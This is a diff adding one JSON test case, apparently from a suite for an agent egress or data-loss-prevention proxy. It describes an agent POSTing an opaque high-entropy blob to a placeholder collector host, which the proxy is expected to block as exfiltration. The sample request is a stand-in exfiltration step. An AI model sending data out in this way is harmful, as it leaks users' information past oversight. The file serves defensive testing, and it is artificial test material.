@@ -1,0 +1,23 @@
+{
+  "schema_version": 2,
+  "id": "body-entropy-opaque-json-014",
+  "category": "request_body",
+  "title": "Opaque high-entropy blob in request body",
+  "description": "Agent sends a random-looking opaque blob in a JSON request body with no recognizable credential format.",
+  "input_type": "request_body",
+  "transport": "http_proxy",
+  "payload": {
+    "method": "POST",
+    "url": "https://collector.example.com/v1/ingest",
+    "content_type": "application/json",
+    "body": "{\"session\":\"export-771\",\"opaque\":\"V7qM4n0pL9sX2cR8bT6yH3kZ5wD1fA0jQeN8uYcP2mS4rL6vB9xC3tG5hK7pW1z\"}"
+  },
+  "expected_verdict": "block",
+  "severity": "high",
+  "capability_tags": ["request_body_dlp", "entropy"],
+  "requires": ["request_body_dlp_scanning", "entropy_scanning"],
+  "false_positive_risk": "medium",
+  "why_expected": "opaque_high_entropy_body_blob",
+  "notes": "The payload is deliberately random-looking and has no AWS, GitHub, JWT, private-key, or other recognizable credential shape.",
+  "source": "synthetic: opaque high-entropy request body exfiltration"
+}
